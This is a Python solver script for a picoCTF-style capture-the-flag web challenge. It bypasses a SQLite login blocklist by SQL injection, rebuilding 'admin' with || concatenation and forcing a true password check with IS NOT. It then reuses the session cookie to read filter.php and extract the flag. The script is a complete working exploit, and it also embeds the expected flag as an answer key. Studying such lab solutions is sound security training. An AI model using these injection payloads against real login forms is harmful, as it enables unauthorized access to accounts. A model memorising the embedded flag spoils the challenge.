#!/usr/bin/env python3
"""Solver for Challenge 174 Web Gauntlet 2 (picoCTF 2021, Web Exploitation).

Single-round filtered SQLite login. filter.php shows the blocklist:
  or and true false union like = > < ; -- /* */ admin
plus a length check on the input. `$_SESSION["winner2"]=1` after a
successful admin login reveals filter.php source (highlight_file) with
the embedded flag; the session resets after viewing, so fetch it once.

Bypass (SQLite `||` concatenation + IS, no space needed... spaces are
allowed here since only listed tokens are stripped):
  user = admi'||'n        -> rebuilds 'admin' without the literal word
  pass = x' IS NOT 'x     -> TRUE comparison without = / like / true
Query becomes:
  SELECT ... WHERE username='admi'||'n' AND password='x' IS NOT 'x'
which logs in as admin. Then GET /filter.php with the same PHPSESSID
returns the highlighted source containing the flag.

Usage: solve_174_web_gauntlet_2.py [host] [port]
Verified: academy{0n3_m0r3_t1m3_38c285e0} (POST /api/submissions/ -> correct:true)
"""
import html
import re
import socket
import sys
import urllib.parse

HOST = "chatelaine.cylabacademy.net"
PORT = 48853
EXPECTED = "academy{0n3_m0r3_t1m3_38c285e0}"
FLAG_RE = re.compile(r"academy\{[^}]*\}|picoCTF\{[^}]*\}")
USER_PAYLOAD = "admi'||'n"
PASS_PAYLOAD = "x' IS NOT 'x"


def exchange(host: str, port: int, request: bytes) -> tuple:
    s = socket.create_connection((host, int(port)), timeout=15)
    try:
        s.sendall(request)
        data = b""
        while True:
            ch = s.recv(8192)
            if not ch:
                break
            data += ch
    finally:
        s.close()
    head, _, body = data.partition(b"\r\n\r\n")
    return head.decode(errors="replace"), body.decode(errors="replace")


def solve(host: str = HOST, port: int = PORT) -> str:
    payload = urllib.parse.urlencode(
        {"user": USER_PAYLOAD, "pass": PASS_PAYLOAD}).encode()
    req = (("POST /index.php HTTP/1.0\r\nHost: x\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: %d\r\n\r\n" % len(payload)).encode() + payload)
    head, _ = exchange(host, port, req)
    ck = next((l.split(":", 1)[1].strip().split(";")[0]
               for l in head.split("\r\n")
               if l.lower().startswith("set-cookie:")), "")
    if not ck:
        raise ValueError("no session cookie after login")
    print("[*] logged in, session:", ck)
    head2, body2 = exchange(
        host, port,
        ("GET /filter.php HTTP/1.0\r\nHost: x\r\n"
         "User-Agent: Mozilla/5.0\r\nCookie: " + ck +
         "\r\n\r\n").encode())
    text = html.unescape(re.sub(r"<[^>]+>", "", body2))
    m = FLAG_RE.search(text)
    if not m:
        raise ValueError("flag not in filter.php: %r" % text[:300])
    flag = m.group(0)
    print("flag:", flag)
    assert flag == EXPECTED, flag
    return flag


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    print(solve(host, port))
